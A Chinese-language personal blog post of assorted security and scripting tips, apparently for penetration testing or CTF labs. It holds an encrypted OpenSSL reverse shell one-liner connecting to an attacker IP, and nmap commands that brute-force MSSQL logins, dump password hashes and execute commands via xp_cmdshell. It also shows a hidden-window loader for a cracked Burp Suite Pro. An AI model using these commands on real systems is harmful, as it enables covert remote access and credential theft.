---
title: Tips
date: 2021-04-10 12:56:45
---

*<u>随手记一些技巧向的东西，可能没什么用</u>*

-----------------------



OpenSSL加密反弹Shell

``` sh
#生成证书
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
#开启监听
openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
```


``` sh
#反弹Shell
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s
```



-----------------


Github查找账号的注册邮箱：

``` shell
curl https://api.github.com/repos/{owner}/{repo}/commits|cat|grep "email"
```

-----------

运行Burpsuite时隐藏Bat文件的窗口：

``` powershell
# Create File BurpLoader.bat
powershell -windowstyle hidden "java -javaagent:BurpSuiteLoader_v2021.2.1.jar -noverify -jar burpsuite_pro_v2021.2.1.jar"
```

-----------------

批量打包并加密文件：

``` python
import os

loc_7z = r'"C:/Program Files/7-Zip/7z.exe"'
output_file = 'archive.zip'
archive_dir = 'archive/dir/'
command = loc_7z+' a ' + ' -p123456 ' + output_file + archive_dir
os.system(command)

```

----------------

使用goaccess解析日志并导出HTML文件

``` bash
goaccess access* --log-format COMMON -o report.html
```

-------------------

python 解码Base64编码的文件

``` python
import base64

j='dGVzdAo='  #Base64 string here

with open('output.file','wb') as w:
    stream=base64.b64decode(j)
    w.write(stream)
```

----------------

java去混淆工具：

[Deobfuscator](https://github.com/java-deobfuscator/deobfuscator)

---------------------

Linux的数据流重定向


```
文件描述符：
    0 - 标准输入
    1 - 标准输出
    2 - 错误输出
    2>&1 - 把错误输出重定向到标准输出
```

------------

nmap获取MSSQL信息

```sh
#获取信息
nmap 10.4.16.254 -p1433 --script ms-sql-ntlm-info
nmap 10.4.16.254 -p1433 --script ms-sql-info
#暴力破解
nmap 10.4.16.254 -p1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt
nmap -p1433 10.4.25.148 --script ms-sql-empty-password
#提取sys users
nmap -p1433 10.4.25.148 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,mssql.database=master,ms-sql-query.query="select * from syslogins" -oN output.txt
# hash dump
nmap -p1433 10.4.25.148 --script ms-sql-dump-hashes --script-args mssql.password=anamaria,mssql.username=admin
#执行命令
nmap -p1433 10.4.25.148 --script ms-sql-xp-cmdshell --script-args mssql.password=anamaria,mssql.username=admin,ms-sql-xp-cmdshell.cmd="type c:\\flag.txt"
```

